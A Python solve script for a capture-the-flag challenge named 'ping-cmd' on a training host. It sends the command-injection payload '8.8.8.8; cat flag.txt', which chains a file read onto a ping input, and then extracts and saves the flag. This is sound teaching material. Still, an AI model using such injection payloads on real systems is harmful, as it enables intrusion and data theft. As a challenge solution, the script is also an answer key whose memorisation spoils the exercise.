#!/usr/bin/env python3
"""
Solve script for ping-cmd (#757)
Target: xebec.cylabacademy.net:24124
"""
import re
import socket
from pathlib import Path

def get_target_conn():
    cfg_file = Path(__file__).resolve().parent / "connection.cfg"
    host, port = "xebec.cylabacademy.net", 24124
    if cfg_file.exists():
        for line in cfg_file.read_text().splitlines():
            if line.startswith("HOST=") and line.split("=", 1)[1]:
                host = line.split("=", 1)[1].strip()
            elif line.startswith("PORT=") and line.split("=", 1)[1]:
                try:
                    port = int(line.split("=", 1)[1].strip())
                except Exception:
                    pass
    return host, port

def solve():
    host, port = get_target_conn()
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket()
    s.settimeout(5)
    s.connect((host, port))
    
    # Receive initial prompt
    s.recv(4096)
    
    # Send payload chaining command execution after ping target
    payload = b"8.8.8.8; cat flag.txt\n"
    s.sendall(payload)
    
    resp = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        except socket.timeout:
            break
    s.close()

    text = resp.decode(errors="ignore")
    print(text)
    
    match = re.search(r"academy\{[^}]+\}", text)
    if match:
        flag = match.group(0)
        print(f"[+] Flag found: {flag}")
        out_flag = Path(__file__).resolve().parent / "flag.txt"
        out_flag.write_text(flag + "\n")
        return flag
    else:
        print("[-] Flag pattern not found in output.")
        return None

if __name__ == "__main__":
    solve()
